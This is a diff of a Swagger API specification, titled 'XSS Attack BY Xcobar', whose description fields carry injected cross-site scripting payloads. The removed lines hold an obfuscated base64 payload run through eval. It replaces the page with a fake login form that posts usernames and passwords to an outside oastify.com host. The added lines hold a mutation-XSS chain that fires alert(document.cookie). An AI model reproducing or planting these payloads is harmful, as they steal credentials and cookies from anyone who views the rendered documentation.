@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Xcobar
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IA0KdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOw0KYS5hY3Rpb249Imh0dHA6Ly91b21hNjk2enQzMHEwcXhienMxNHdvbWhsOHJ5Zm4ub2FzdGlmeS5jb20iOw0KYS5tZXRob2Q9J1BPU1QnOw0KYS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgDQpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyIn' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IA0KdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOw0KYS5hY3Rpb249Imh0dHA6Ly91b21hNjk2enQzMHEwcXhienMxNHdvbWhsOHJ5Zm4ub2FzdGlmeS5jb20iOw0KYS5tZXRob2Q9J1BPU1QnOw0KYS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9jZW50ZXI+JzsgDQpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyIn' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
 
           format: int64
           in: path
